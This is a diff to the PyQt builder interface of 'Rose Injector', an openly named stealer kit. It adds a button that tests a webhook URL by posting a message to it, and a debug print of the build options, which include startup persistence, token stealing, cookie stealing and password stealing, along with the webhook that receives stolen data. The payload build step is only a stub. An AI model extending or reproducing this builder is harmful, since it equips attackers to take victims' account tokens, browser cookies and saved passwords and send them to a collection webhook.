@@ -5,6 +5,7 @@
 from PyQt5 import QtCore, QtGui, QtWidgets
 import webbrowser
 import time
+import requests
 
 __version__ = 1.0
 __repo__ = "https://github.com/DamagingRose/Rose-Injector/"
@@ -153,6 +154,7 @@ class Ui_MainWindow_vailB(object):
         self.B_github_suvan.clicked.connect(self.svnghub)
         self.B_clearconsole.clicked.connect(self.clearconsole)
         self.B_vail_repo.clicked.connect(self.github)
+        self.B_testhook.clicked.connect(self.test_hook)
         self.B_build.clicked.connect(self.pb_build) # connect a function to the push button by doing this so (All push buttons are described as B_.. then the identifier.)
         QtCore.QMetaObject.connectSlotsByName(MainWindow_vailB)
     def retranslateUi(self, MainWindow_vailB):
@@ -232,10 +234,28 @@ class Ui_MainWindow_vailB(object):
     def clearconsole(self):
         self.console_0.clear()
 
+    def test_hook(self): #ISSUE: FREEZES GUI, NEED TO FIX AND MAKE THE REQUEST NON BLOCKING
+        try:
+            resp = requests.post(self.LE_webhook_url.text(), json = {"content":"Rose Injector Webhook Test"})
+            resp.raise_for_status() # will trigger except block if webhook is invalid
+            QtWidgets.QMessageBox.information(self.centralwidget, "Webhook Test", "Webhook OK")
+        except Exception:
+            QtWidgets.QMessageBox.critical(self.centralwidget, "Webhook Test", "Webhook Failed")
+
     # The main function when the Build button gets pushed.
     def pb_build(self):
         self.statusinsertor("\nStarted building....")
         self.prorsmng("start")
+        print(
+            self.CB_startup.isChecked(),
+            self.CB_injection.isChecked(),
+            self.CB_tokensteal.isChecked(),
+            self.CB_cookiesteal.isChecked(),
+            self.CB_passsteal.isChecked(),
+            self.ping.isChecked(),
+            self.comboBox.currentText(),
+            self.LE_webhook_url.text()
+            ) # selected config
         # function something
         self.prorsmng("stop")
 
